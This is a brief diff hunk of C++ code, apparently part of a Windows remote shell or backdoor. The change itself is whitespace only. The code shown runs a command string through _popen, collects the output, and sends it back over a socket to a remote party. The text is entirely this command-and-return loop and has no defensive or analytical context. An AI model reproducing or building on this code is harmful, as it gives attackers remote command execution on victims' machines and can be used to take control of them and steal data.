@@ -83,12 +83,12 @@ int main(const int argc, const char* argv[]){
         FILE* p = _popen(szBuffer, "r");
         char szCmdResultBuffer[4096];
         std::string result;
-		while(fgets(szCmdResultBuffer, sizeof(szCmdResultBuffer), p) != nullptr) {
-			result += szCmdResultBuffer;
-		}
-		_pclose(p);
-		std::cout << "SNDRSLT: " << result << std::endl;
-		send(sock, result.c_str(), result.length(), 0);
+        while(fgets(szCmdResultBuffer, sizeof(szCmdResultBuffer), p) != nullptr) {
+	        result += szCmdResultBuffer;
+        }
+        _pclose(p);
+        std::cout << "SNDRSLT: " << result << std::endl;
+        send(sock, result.c_str(), result.length(), 0);
 	}
     closesocket(sock);
     ExitProcess(EXIT_SUCCESS); // Like return, but the OS/kernel likes it a bit more - best practice
